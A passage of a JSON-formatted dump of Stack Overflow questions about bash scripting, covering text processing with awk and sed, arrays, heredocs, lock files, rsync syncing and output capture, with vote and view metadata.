<em>inputYes.txt</em> should read</p>\n\n<pre><code>DummyOne\nStart\nThis\nWhy\nNo\nEnd\nDummyTwo\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":1,"up_vote_count":8,"down_vote_count":1,"view_count":88,"score":7,"question_id":9027998,"title":"Parse score reports and extract point sums and averages","body":"<p>i want to calculate:</p>\n\n<ul>\n<li>the total points (sum)</li>\n<li>the today points (sum)</li>\n<li>the total points (average)</li>\n<li>the today points (average)</li>\n</ul>\n\n<p>i have no idea with bash scripting other than i need to start with: #!/bin/bash</p>\n\n<p>here's a sample of my file</p>\n\n<pre><code>#file 14516 - 2011-01-26 19:01:00 EDT#\nuser: xxxxxxxx@email.com / id(11451611)\nlastlogin: 1295896515\ntotal_points: 11.76 / today: 5.21\ngameid: 51\n\nuser: xxxxxxxx@email.com / id(11837327)\nlastlogin: 1293893041\ntotal_points: 416.1 / today: 98.1\ngameid: 49\n\nuser: xxxxxxxx@email.com / id(11451611)\nlastlogin: 1294917135\ntotal_points: 1.76 / today: 0.21\ngameid: 51\n</code></pre>\n"},{"tags":["bash","echo","eof","cat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12466786,"title":"marking end of file while redirecting to a file in a non-interactive bash script using cat","body":"<p>I'm trying to redirect a multi-line string to a file. The string contains special chars like <strong>quota</strong> and looks like this:</p>\n\n<pre><code>import \"this\"\nimport \"that\"\nmain() {\n    println(\"some text here\");\n}\n</code></pre>\n\n<p>I can use <code>echo</code> such as:</p>\n\n<pre><code>echo \"import \\\"this\\\"\nimport \\\"that\\\"\nmain() {\n    println(\\\"some text here\\\");\n}\" &gt; myfile.txt\n</code></pre>\n\n<p>The problem with this approach is that I need to escape all <strong>quota</strong> chars. I thought about using <code>cat</code> to eliminate the need for escaping. It works well in interactive shells so that I can type <code>cat &gt; myfile.txt</code> and then write my string without escaping and then mark the end of file with <code>&lt;control&gt;d</code>.</p>\n\n<p>How can I mark <code>EOF</code> in the script without the actual key sequence <code>&lt;control&gt;d</code>?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12466177,"title":"Assign value to element of an array inside a loop in bash","body":"<p>I would like to modify the value to an element of an array and I don't know the syntax to do it</p>\n\n<pre><code>for i in `seq 0 8`;\ndo\n    if [ ${config[$i]} = \"value1\" ]\n        then config[$i] = \"value2\"    #&lt;- This line\n    fi\ndone\n</code></pre>\n"},{"tags":["bash","cygwin"],"answer_count":6,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2198,"score":3,"question_id":6811435,"title":"Why does Cygwin execute shell commands very slowly?","body":"<p>Just tests a very simple command like:</p>\n\n<pre><code>while true; do bash -c \"echo hello\"; done\n</code></pre>\n\n<p>You will find how much slow the bash in Cygwin is. Does anybody know why?</p>\n\n<p>It's a fresh install of cygwin 1.7 on win7.</p>\n\n<p>thanks to Jared's testing idea, I modified the command to this(adds bash -c):</p>\n\n<pre><code>time for i in {1..10} ; do bash -c \"echo Hello\" ; done\nHello\n...\nreal 0m7.711s //it's the problem\nuser 0m0.091s\nsys 0m0.476s\n</code></pre>\n"},{"tags":["bash","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12459603,"title":"How to use Bash script or awk to extract a file name","body":"<p>I receive files with names constructed in the following format</p>\n\n<pre><code>[2letters e.g.AF][6-digit-number sequence][Date in ccyymmdd][Time in hhmmss]\n</code></pre>\n\n<p>For Example:</p>\n\n<pre><code>AF00010720120917144500.csv\n</code></pre>\n\n<p>I want to automate loading such files onto my database using the date part of the file.</p>\n\n<p>something which may start like this:</p>\n\n<pre><code>#!/bin/bash\nfilename_datepart=$(echo `date -d \"1 day ago\" +\"%d%m%Y\"`)\nfilename=\"/home/hlosi/AF000107\"$filename_datepart\".csv\"\n</code></pre>\n\n<p>But remember, the part <code>000107</code> changes with each new file.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12358474,"title":"Bash: wait for process to exit while tailing log file","body":"<p>In a bash script, I'm waiting on a child process's pid using wait. That child process is writing to a log file.  Is there a way in the bash script to tail that log file to std out while at the same time waiting on the process to complete?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12432764,"title":"Select nested statements","body":"<p>I wrote something like this</p>\n\n<pre><code>    #!/bin/bash\nPS3='Select an option and press Enter: '\nselect tree_1 in Date Host Users Quit\ndo\n    case $tree_1 in\n        Date)\n            select tree_1_1 in Date1 Date2\n            do\n                case $tree_1_1 in\n                    Date1) date;;\n                    Date2) date;;\n            esac\n    done\n        Host)  hostname;;\n        Users)  who;;\n        Quit)  break;;\n    esac\ndone\n</code></pre>\n\n<p>and after execute I have</p>\n\n<p>./1menu: line 14: syntax error near unexpected token `)'</p>\n\n<p>./1menu: line 14: `     Host)  hostname;;'</p>\n\n<p>Can you tell me where the problem is? Thank for help.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":78,"score":1,"question_id":12438067,"title":"Reading data with bash, \"for i in\" combined with while","body":"<p>I've the following challenge. I'm trying to read some data from a Datalogger with WebIF, the script basically runs as expected. But I'ld like to add a check using a while loop. And now I'm stuck at that \"for i in &amp; while\" combo...</p>\n\n<pre><code>    #!/bin/bash\n    PASSWD=blah\n    OUTFILE=$(date +%d).csv\n    OUTPATH=$(date +%Y/%m/)\n    LOGPATH=\"./test/log/\"\n    BASEPATH=\"./test/\"\n    DEVICENAME=wc-s0\n    NETWORK=somewhere.lan\n    CURLPARA=\"-silent --connect-timeout 5\"\n    TRYS=3\n\n    for i in {0..5};\n    do\n        TIME=\"$(date +\"%Y-%m-%d %H:%M:%S\")\";\n        while [[ $TRYS -ne 0 ]] ; do\n             VALUE=$(curl $CURLPARA \"http://\"$DEVICENAME\".\"$NETWORK\"/counter?PW=\"$PASSWD\"&amp;\"|grep counter|cut -sd \";\" -f $(( i+2 ))|sed 's#kWh##g'|sed 's#kVARh##g'|sed 's#,#.#g');\n        rc=$?\n        if [[ $rc -eq 0 ]] ; then\n            TRYS=1\n        fi\n        ((TRYS = TRYS - 1))\n        done\n\n        if [[ $rc -eq 0 ]] ; then\n        echo \"Read $DEVICENAME input\"$i\".\"\n        else\n        echo \"Timeout while reading $DEVICENAME input\"$i\".\"\n        fi\n        echo \"$VALUE\"\n        echo -n \"$DEVICENAME input\"$i\"; \"\n        echo \"$TIME; \"\ndone\n</code></pre>\n\n<p>The out put is as follow's:</p>\n\n<pre><code>Read wc-s0 input0. \nwc-s0 input0; 2012-09-15 16:58:34;  \nRead wc-s0 input1. \nwc-s0 input1; 2012-09-15 16:58:38;\nRead wc-s0 input2. \nwc-s0 input2; 2012-09-15 16:58:38;\nRead wc-s0 input3.\nwc-s0 input3; 2012-09-15 16:58:38;\nRead wc-s0 input4.\nwc-s0 input4; 2012-09-15 16:58:38;\nRead wc-s0 input5.\nwc-s0 input5; 2012-09-15 16:58:38;\n</code></pre>\n\n<p>The \"0.560\" is a $VALUE but I'ld expect it to be like this:</p>\n\n<pre><code>Read wc-s0 input0.\nwc-s0 input0; 2012-09-15 15:58:36; 0.560  \nRead wc-s0 input1.\nwc-s0 input1; 2012-09-15 15:58:37; \"$VALUE2\"\n</code></pre>\n\n<p>But I can't get it to print the data this way...</p>\n\n<p>Hope one of you has a hint!</p>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":159,"score":1,"question_id":5912552,"title":"Computing differences between columns of tab delimited file","body":"<p>I have a tab delimited file of 4 columns and n number of rows. </p>\n\n<p>I want to find the difference in values present in column 3 and 2 and want to store them in another file.</p>\n\n<p>This is what I am doing</p>\n\n<pre><code>cat filename | awk '{print $3 - $2}'&gt;difference\n</code></pre>\n\n<p>and it is not working. How can I improve the code?</p>\n\n<hr>\n\n<p><em>Solution:</em></p>\n\n<blockquote>\n  <p>I was missing the closing single quotation, and my eyes were so tuned to the screen that I couldn't figure it out in 35 lines code what was going wrong...and out of frustration I wrote the question on forum ... and [to complete] the comedy of errors, the syntax I wrote here [in the] question is correct (as it contains both single quotes).</p>\n  \n  <p>Thank you all for your help.</p>\n</blockquote>\n"},{"tags":["bash","ubuntu","terminal"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12449350,"title":"How to color character linux terminal","body":"<p>I would like your your help writing some code:\nI would like Ubuntu 12.04.1 Terminal to color \"/\" character opposite as other text.</p>\n\n<p>This could be very important for pretty much everyone, who writes bash/python directly in console...</p>\n\n<p><strong>Any ideas where to start?</strong></p>\n\n<p>I'm thinking of a custom plugin fo terminal, that could parse text right before it is printed? </p>\n"},{"tags":["bash","script","screen","gnome"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12451677,"title":"Bash script to generate four terminals attached to the same screen session","body":"<p>I'm trying to make a script to create four terminals, each running its own instance of screen, send a bash command (top in my example) to the first, and then link that session to each of the others. See the end of the post for why I would ever want to do that.</p>\n\n<p>Anyway, it does almost what I want it to; I end up with four terminals each running their own properly named instance of screen, and all but the last one linked to the original session. But not that last one. So here's the code, and I'm hoping someone can let me know why it's not behaving as expected:</p>\n\n<pre><code>#!/bin/bash\n\nfor i in {1..4}\ndo\n    gnome-terminal --window-with-profile=hdesk$i -e 'screen -S hdesk'$i\ndone\n\nscreen -XS hdesk1 stuff 'top^M'\n\nfor i in {2..4}\ndo\n    screen -XS hdesk$i stuff 'screen -x hdesk1^M'\ndone\n</code></pre>\n\n<p>I tried doing the same line by line from a terminal instead of running it as a script and it worked fine. For some reason the session 'hdesk4', while it exists, isn't attaching 'hdesk1'.</p>\n\n<p>As for why, I'm using compiz, and I want this terminal to be sticky (present on all virutal desktops). But I have eight virtual desktops in two rows of four, and I don't want this sticky on the top row, just the bottom, so I can't just set a single terminal to be sticky. So any solution that achieves that goal but avoids this screen mess altogether would also be welcome.</p>\n\n<p><strong>edit</strong>: It now works, although I made no changes to the code or to anything else between the not working and the working. Just suspended my computer overnight and unsuspended.</p>\n"},{"tags":["bash","synchronization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12460279,"title":"How to keep two folders automatically synchronized?","body":"<p>I would like to have a synchronized copy of one folder with all its subtree.<br>\nIt should work in an automatically way; whenever I create, modify or delete staff from the original-folder those changes must be automatically applied to the sync-folder.<br> \nWhich is the best approach to this task?<br>\nBTW: I'm on Ubuntu 12.04</p>\n\n<p><strong>EDITED:</strong><br>\nFinal goal is to have a separated real-time backup copy, without the use of symlinks o mount.\nI used Ubuntu One to synchronize data between my computers, and after a while something went wrong and all my data was lost during a synchronization.<br>\nSo I thought to add a step further to keep a backup copy of my data:<br>\n- I keep my data stored on a \"folder A\"<br>\n- I need the answer of my current question to create a one way sync of \"folder A\" to \"folder B\" (cron a script with rsync? could be?). I need it to be one way only from A to B, any changes to B must not be applied to A.<br>\n- The I simply keep synchronized \"folder B\" with Ubuntu One<br>\n<br>\nIn this manner any change in A will be appled to B, which will be detected from U1 and synchronized to the cloud.<br>\nIf anything goes wrong and U1 delete my data on B, I always have them on A.<br></p>\n\n<p><br>\n<strong>EDITED 2:</strong>\nInspired by lanzz's comments, another idea could be to run rsync at startup to backup the content of a folder under Ubuntu One, and start Ubuntu One only after rsync is complited.\nWhat do you think about that?\nSo how to know when rsync ends?</p>\n"},{"tags":["bash","email"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12460448,"title":"bash mail: command output in subject","body":"<p>I try send a mail with <code>mail</code> command, with the output of other command in the subject</p>\n\n<pre><code>subj=\"hello from $(hostname -s) $(date)\" \necho \"data\" | mail -s $subj mail@mail\n</code></pre>\n\n<p>but I only get the first part of subject (<code>hello from</code>).</p>\n\n<p>why?</p>\n"},{"tags":["file","bash","wildcard","space"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12456562,"title":"filename contains space and wildcard in a variable","body":"<p>I receive files which names contain spaces and change every week (the name contains the week number)</p>\n\n<p>IE, the file for this week looks like <code>This is the file - w37.csv</code></p>\n\n<p>I have to write a script to take this file into account.\nI didn't succeed in writing this script.</p>\n\n<p>If I do :</p>\n\n<pre><code>    $FILE=\"This is the file - w*.csv\"\n</code></pre>\n\n<p>I don't find <code>/dir/${FILE}</code></p>\n\n<p>I tried <code>\"This\\ is\\ the\\ file - w*.csv\"</code></p>\n\n<p>I tried <code>/dir/\"${FILE}\"</code> and <code>\"/dir/${FILE}\"</code></p>\n\n<p>But I still can't find my file</p>\n\n<p>It looks like the space in the name <b>needs</b> the variable to be double-quoted but, then, the wildcard is not analysed.</p>\n\n<p>Do you have an idea (or THE answer)?</p>\n\n<p>Regards,</p>\n\n<p>Olivier</p>\n"},{"tags":["bash","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":101,"score":-1,"question_id":12443105,"title":"Insert text at the beginning of each line from 2 to end - 5","body":"<p>I want to insert a word followed by a tab character at the start of each line in a file (in-place insertion) but starting from line number 2 to all the lines but last 5 lines. </p>\n\n<p>So if a file has 10 lines, I want to insert from line number 2 to line number 5 - I want to keep lines 1 and 6-10 intact in this case.</p>\n\n<p>The file can have lines in millions (currently upto 10 million)</p>\n\n<pre><code>sed -i \"s/^/word\\t/\" filename \n</code></pre>\n\n<p>The above works, but I want to insert on the first and last 5 lines. Also given a line range, calculating the number of lines will be another operation. Since the line numbers can vary, this extra operation can become an overhead. Looking for an efficient solution. Here is what I have tried so far:</p>\n\n<pre><code>COUNT=$((`wc -l test_csnap_delta.csv | cut -d ' ' -f 1` - 5))\nsed -n -i '2,$COUNT s/^/word\\t/' \n</code></pre>\n\n<p>However the above is deleting the entire file data.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","syntax","expansion"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12458171,"title":"Bash variable expansion syntax with braces","body":"<p>What does the following bash syntax mean?</p>\n\n<pre><code>MY_VAR=${MY_VAR:-\"mystring\"}\n</code></pre>\n\n<p>Thank you in advance.</p>\n"},{"tags":["bash","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12457457,"title":"count number of lines in terminal output","body":"<p>couldn't find this on SO. I ran the following command in the terminal: </p>\n\n<pre><code>&gt;&gt; grep -Rl \"curl\" ./\n</code></pre>\n\n<p>and this displays the list of files where the keyword curl occurs. I want to count the number of files. First way I can think of, is to count the number of lines in the output that came in the terminal. How can I do that?</p>\n"},{"tags":["bash","unix","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12455310,"title":"please help me about the grep usage in unix, cannot identify the lower/hyper case","body":"<p>I want my shell can only find out the pattern in the quote,\nbut the result also returned something like <code>\"MSGxxxxx\"</code> \nAnybody who can give me some advise?</p>\n\n<p>Here is my script:</p>\n\n<pre><code>if egrep -e 'Msg|duplicate|deadlock|status = -|terminated due to disconnect' MYFILE.log\n then\n    echo \"I found something in your RAW data.\"    \n  else\n    echo \"Nothing found!\"\nfi\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12456747,"title":"Date format in bash","body":"<p>Simple bash question... I suppose, I'm new.</p>\n\n<p>I have substract date from system time</p>\n\n<pre><code>date_from=`date -d \"30 minutes ago\"`\n</code></pre>\n\n<p>after, I want format the result in <code>$date_from</code>  in 'yyyy-mm-dd'</p>\n\n<p>how can I do that?</p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12452419,"title":"Shell command to update configuration file","body":"<p>Looking for a way to automate enabling a yum repository in CentOS. The configuration file by default looks like:</p>\n\n<pre><code>[remi]\nname=Les RPM de remi pour Enterprise Linux $releasever - $basearch\n#baseurl=http://rpms.famillecollet.com/enterprise/$releasever/remi/$basearch/\nmirrorlist=http://rpms.famillecollet.com/enterprise/$releasever/remi/mirror\nenabled=0\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-remi\nfailovermethod=priority\n\n[remi-test]\nname=Les RPM de remi en test pour Enterprise Linux $releasever - $basearch\n#baseurl=http://rpms.famillecollet.com/enterprise/$releasever/test/$basearch/\nmirrorlist=http://rpms.famillecollet.com/enterprise/$releasever/test/mirror\nenabled=0\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-remi\n</code></pre>\n\n<p>Notice <code>enabled=0</code> in the <code>[remi]</code> block. That is what needs to be flipped on. The problem is that I can't just search for <code>enable=0</code> since the <code>remi-test</code> block also has it, but I don't want to enable the test repo.</p>\n\n<p>Thanks.</p>\n"},{"tags":["image","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12412827,"title":"Bash to determine file size","body":"<p>Still learning bash but I had some questions in regards to my script.</p>\n\n<p>My goal with the script is to access a folder with jpg images and if an image is 34.9kb it will return file not present.  34.9kb is the size of the image that shows \"image not present\".  </p>\n\n<pre><code>#!/bin/bash\n\n#Location\nDIR=\"/mnt/windows/images\"\n\nfile=file.jpg\nbadfile=12345\nactualsize=$(du -b \"$file\" | cut -f 1)\nif [ $actualsize -ge $badfile ]; then\n    echo $file does not exist &gt;&gt; results.txt\nelse\n    echo $file exists &gt;&gt; results.txt\nfi\n</code></pre>\n\n<p>I need it to print each line to a txt file named results.  I did research where some people either suggested using <code>du -b</code> or <code>stat -c '%s'</code> but I could not see what the pros and cons would be for using one or the other.  Would the print to file come after the if else or stay with the if since Im printing for each file??  I need to print the name and result in the same line.  What would be the best way to echo the file?? </p>\n"},{"tags":["bash","loops"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":67,"score":-1,"question_id":12426526,"title":"Loop a line command in bash","body":"<p>How would I loop this line to print everything jpg to a text file??</p>\n\n<pre><code>stat --printf=\"%s\" *.jpg &gt;&gt; results.txt\n</code></pre>\n\n<p>How would you also be able to print results.txt based on a file size?? How would the code look??  The exact size of the file is 40318</p>\n"},{"tags":["arrays","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12453013,"title":"Failure to populate Bash array from AWK statement","body":"<p>I need to get 1 or more locations from a config file and then check each location for some files.  I have an AWK and SED combination which finds the locations and then read the list of files from a text file.  I want to check each location for the file and thought to use a bash array to hold the locations. </p>\n\n<p>However for some reason I cannot populate the array from the AWK statement.  It appears to me that it loads the complete content into the first element.  </p>\n\n<p>If I manually populate the array it works; e.g. replace the line array=$(awk ...\nwith</p>\n\n<pre><code>array[1]=/docs01/objdata/admin/p1dig\narray[2]=/docs02/objdata/admin/p1dig\narray[3]=/docs03/objdata/admin/p1dig\narray[4]=/docs04/objdata/admin/p1dig\n</code></pre>\n\n<p>In the code snippet below I have removed the outer (filename) loop and added some debugging context.</p>\n\n<pre><code>#!/bin/bash\n\ndeclare -a array\n\nOBJECTIVE_CONF=/u01/app/objective/perf/DOS1/config/objConf.xml\nFILE=/tmp/DoS1_files.dsv\n\n# IFS=$\"/n\"\narray=$(awk '/&lt;volume&gt;/,/&lt;\\/volume&gt;/' $OBJECTIVE_CONF | grep \"&lt;path&gt;\" | sed \"s#&lt;[/]*path&gt;##g\" | sed 's/^[ \\t]*//' |sed 's/[ \\t]*$//' )\n\nelement_count=${#array[@]}\necho \"element_count is : $element_count \"\n\n\necho \"index is: $index\"\necho \"${array[$index]}\"\n\n   echo \"filename loop\"\n\n   index=0\n   while [ \"$index\" -lt \"$element_count\" ]\n   do\n      let \"index = $index + 1\"\n      echo \"index is: $index\"\n      echo \"ls ${array[$index]}/filename_from_loop\"\n   done\n   echo \"leaving loop\"\n</code></pre>\n\n<p>The Awk statement gives me the expected result when run from the command line.  I AWK for the start and finish XML tags, grep inside that for the PATH and use SED to remove the PATH exm tags and leading and training space. </p>\n\n<pre><code>bash-3.00$ awk '/&lt;volume&gt;/,/&lt;\\/volume&gt;/' $OBJECTIVE_CONF | grep \"&lt;path&gt;\" | sed \"s#&lt;[/]*path&gt;##g\" | sed 's/^[ \\t]*//' |sed 's/[ \\t]*$//'\n/docs01/objdata/admin/p1dig\n/docs02/objdata/admin/p1dig\n/docs03/objdata/admin/p1dig\n/docs04/objdata/admin/p1dig\n</code></pre>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12454731,"title":"Meaning of =~ operator in Shell script","body":"<p>I came acreoss a shell script where the code  is </p>\n\n<pre><code>for line in $LIST_ARRAY;do\nif [[ $LIST_ARRAY =~ $line ]]\nthen\necho \"true\"\n....\n...\n.\n</code></pre>\n\n<p>what is the use of <strong>=~</strong> in this case .</p>\n"},{"tags":["bash"],"answer_count":8,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1578,"score":6,"question_id":1440967,"title":"How do I make sure my bash script isn't already running?","body":"<p>I have a bash script I want to run every 5 minutes from cron... but there's a chance the previous run of the script isn't done yet... in this case, i want the new run to just exit. I don't want to rely on just a lock file in /tmp.. I want to make sure sure the process is actually running before i honor the lock file (or whatever)... </p>\n\n<p>Here is what I have stolen from the internet so far... how do i smarten it up a bit? or is there a completely different way that's better?</p>\n\n<pre><code>if [ -f /tmp/mylockFile ] ; then\n  echo 'Script is still running'\nelse\n  echo 1 &gt; /tmp/mylockFile\n  /* Do some stuff */\n  rm -f /tmp/mylockFile\nfi\n</code></pre>\n"},{"tags":["c++","c","bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":118,"score":0,"question_id":12453266,"title":"echo (shell) and C language","body":"<p>I have a program written in C language. In this program, I have an integer variable QS. The value of this variable changes during execution of the program\nIn this program written in C, I want to display this variable QS using the echo command shell</p>\n\n<p>I heard about the system () function of the diaper C gives hand to use the terminal or console</p>\n\n<p>system (\"echo $ QS\") when I do that, the variable QS is not recognized and it displays nothing.</p>\n\n<p>Do you have any specific answers on how I could do this? and how to recognize the variable in C language?</p>\n\n<p>I know that with a simple printf, I can display this variable, but what I want is to use  echo.</p>\n\n<p>Thank you in advance for your answers.</p>\n"},{"tags":["bash","replace","terminal","line","last"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":5922,"score":5,"question_id":2388090,"title":"How to delete and replace last line in the terminal using bash?","body":"<p>I want to implement a progress bar showing elapsed seconds in bash. For this, I need to erase the last line shown on the screen (command \"clear\" erases all the screen, but I need to erase only the line of the progress bar and replace it with the new information).</p>\n\n<p>Final result should look like:</p>\n\n<pre><code>$ Elapsed time 5 seconds\n</code></pre>\n\n<p>Then after 10 seconds i want to replace this sentence (in the same position in the screen) by:</p>\n\n<pre><code>$ Elapsed time 15 seconds\n</code></pre>\n"},{"tags":["regex","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12452009,"title":"In bash how do I match the a string of the form [SOME_ALPHA_NUM_WORD]?","body":"<p>I have tried stuff like <code>=~ \"\\[[A-Za-z0-9]+\\]\"</code> which I would expect would work but doesnt. I also tried <code>\"[[A-Za-z0-9]+]\"</code> and <code>\"\\[[:alnum:]+\\]\"</code>. What am I doing wrong? Sample line I want to match: <code>[RTNUT18]</code> (I am iterating through a file, some lines are of this form)</p>\n\n<p>This is my code snippet:</p>\n\n<pre><code>while read line;\ndo\n    if [[ $line =~ \"^\\[[A-Za-z0-9]+\\]$\" ]]; then\n        echo match\n    else\n        echo no match\n    fi\ndone &lt; $1\n</code></pre>\n\n<p>This is a sample file:</p>\n\n<pre><code>[RBPAT7]\nWhatever=foo,bla\nOtherline\nRRR\n</code></pre>\n\n<p>and I run:</p>\n\n<pre><code>./script.sh thefile.txt\n</code></pre>\n\n<p>I am not getting a hit on the <code>[RBPAT7]</code> line at all</p>\n"},{"tags":["linux","bash","sed","newline"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12452043,"title":"How to remove last new line from stream from command line","body":"<p>I have command line this:</p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>xclip -o -sel clip | sed -e 's/^ *\"\\(.*\\)\"+\\?/\\1/g' | tr -d '\\n' |\n    sed -e 's/.\\{,55\\}/\"&amp;\"+\\n/g' |\n    sed -e \"2,$ s/^/$(seq 22 | xargs -I{} echo -n ' ')/\" |\n    sed -e '$ s/+$//' | xclip -sel clip\n</code></pre>\n\n<p>which format string in source code (I use it to format long string in javascript file - 55 and 22 are harcoded width and indent)</p>\n\n<pre><code>var foo = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit\"+\n          \". Nulla sed dolor nisl, in suscipit justo. Donec a enim\"+\n          \" et est porttitor semper at vitae augue. Proin at nulla\"+\n          \" at dui mattis mattis. Nam a volutpat ante. Aliquam con\"+\n          \"sequat dui eu sem convallis ullamcorper.\"\n</code></pre>\n\n<p>but when I copy past code inside parentheses <code>var foo = foo.bar()</code> I got this</p>\n\n<pre><code>var foo = foo.bar(\"Lorem ipsum dolor sit amet, consectetur adipiscing elit\"+\n                  \". Nulla sed dolor nisl, in suscipit justo. Donec a enim\"+\n                  \" et est porttitor semper at vitae augue. Proin at nulla\"+\n                  \" at dui mattis mattis. Nam a volutpat ante. Aliquam con\"+\n                  \"sequat dui eu sem convallis ullamcorper.\"\n)\n</code></pre>\n\n<p>New line after last quote, not the big deal but anybody know how can I remove that last new line?</p>\n"},{"tags":["bash","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12452298,"title":"bash command to print column at specific range of line numbers","body":"<p>I'm trying to get the values in column X at lines 5 to 5 + Y. I'm guessing there's a quick way to do this with <code>awk</code>. How is this done?</p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12451638,"title":"ways to invoke Unix shell scripts (\".\", \"source\")","body":"<p>To activate a TurboGears virtualenv (just as an example), you do this:</p>\n\n<pre><code>. bin/activate\n</code></pre>\n\n<p>Or this:</p>\n\n<pre><code>source bin/activate\n</code></pre>\n\n<ol>\n<li><p>Why does the current directory \".\" work as a command?</p></li>\n<li><p>Why use \"source\" or \".\" at all?  Why not simply \"bin/activate\"?</p></li>\n</ol>\n\n<p>(I did a little Web searching on this, but \".\" and \"source\" get a lot of bad hits.)</p>\n"},{"tags":["bash","ubuntu","tee","process-substitution"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12451278,"title":"bash: Capture stdout to a variable but still display it in the console","body":"<p>I have a bash script which calls several long-running processes.  I want to capture the output of those calls into variables for processing reasons.  However, because these are long running processes, I would like the output of the rsync calls to be displayed in the console in <em>real-time</em> and not after the fact.</p>\n\n<p>To this end, I have <a href=\"http://sebthom.de/158-bash-capturing-stderr-variable/\" rel=\"nofollow\">found</a> a way of doing it but it relies on outputting the text to /dev/stderr.  I feel that outputting to /dev/stderr is not a good way of doing things.</p>\n\n<pre><code>VAR1=$(for i in {1..5}; do sleep 1; echo $i; done | tee /dev/stderr)\n\nVAR2=$(rsync -r -t --out-format='%n%L' --delete -s /path/source1/ /path/target1 | tee /dev/stderr)\n\nVAR3=$(rsync -r -t --out-format='%n%L' --delete -s /path/source2/ /path/target2 | tee /dev/stderr)\n</code></pre>\n\n<p>In the example above, I am calling rsync a few times and I want to see the file names as they are processed, but in the end I still want the output in a variable because I will be parsing it later.</p>\n\n<p>Is there a 'cleaner' way of accomplishing this? </p>\n\n<p>If it makes a difference, I am using Ubuntu 12.04, bash 4.2.24.</p>\n"},{"tags":["bash","redirect","file-descriptor"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1767,"score":5,"question_id":4102475,"title":"Bash redirection with file descriptor or filename in variable","body":"<p>In my script I want to be able to write to either a file or to stdout based on certain conditions.  I'm curious as to why this doesn't work in my script:</p>\n\n<pre><code>out=\\&amp;1\necho \"bird\" 1&gt;$out\n</code></pre>\n\n<p>I tried different combination of quotes, but I keep having a \"&amp;1\" file created instead of it writing to stdout.  What can I do to get this to work how I want?</p>\n"},{"tags":["python","bash","subprocess"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":354,"score":6,"question_id":10479825,"title":"Python: subprocess.call broken pipe","body":"<p>I'm trying to call a shell script in python, but it keeps reporting broken pipe error (the result is OK, but i don't want to see the error message in STDERR). I have pinpointed the cause, and it can be reproduced as the following snippet:</p>\n\n<p><code>subprocess.call('cat /dev/zero | head -c 10 | base64', shell=True)</code></p>\n\n<p>AAAAAAAAAAAAAA==</p>\n\n<p>cat: write error: Broken pipe</p>\n\n<p><code>/dev/zero</code> is an infinite stream, but the <code>head -c 10</code> only reads 10 bytes from it and exits, then cat will get SIGPIPE because of the peer has closed the pipe. There's no broken pipe error message when i run the command in shell, but why python shows 